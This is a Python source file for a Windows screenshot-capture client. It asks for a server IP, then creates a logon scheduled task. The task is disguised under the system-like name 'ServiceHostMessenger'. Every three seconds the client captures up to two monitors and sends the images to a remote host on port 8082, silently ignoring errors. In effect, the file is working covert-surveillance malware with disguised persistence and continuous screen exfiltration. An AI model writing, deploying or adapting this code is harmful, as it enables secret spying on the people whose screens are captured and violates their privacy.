import time
import sys
import os
import subprocess
import tkinter as tk
from tkinter import simpledialog
from client_screenshot import capture_screenshots
from client_network import send_screenshot

TASK_NAME = "ServiceHostMessenger"


def prompt_for_server_ip():
    root = tk.Tk()
    root.withdraw()
    ip = simpledialog.askstring("Service Host: Messenger Provider", "Enter server IP or hostname:")
    root.destroy()
    if ip:
        return ip.strip()
    return None


def create_or_update_task(ip: str):
    exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    tr = f'"{exe_path}" {ip}'
    cmd = ["schtasks", "/Create", "/TN", TASK_NAME, "/SC", "ONLOGON", "/TR", tr, "/F"]
    res = subprocess.run(cmd, capture_output=True, text=True)
    return res.returncode == 0, (res.stdout or res.stderr)


def start_task_now():
    subprocess.run(["schtasks", "/Run", "/TN", TASK_NAME], capture_output=True, text=True)


def run_client_loop(ip: str):
    host = ip + ":8082"
    interval = 3
    while True:
        try:
            shots = capture_screenshots(max_monitors=2)
            for mon, img_bytes in shots:
                send_screenshot(host, mon, img_bytes)
        except Exception:
            pass
        time.sleep(interval)


def main():
    if len(sys.argv) < 2:
        ip = prompt_for_server_ip()
        if not ip:
            return
        ok, _ = create_or_update_task(ip)
        if ok:
            start_task_now()
        return

    ip = sys.argv[1]
    run_client_loop(ip)


if __name__ == "__main__":
    main()
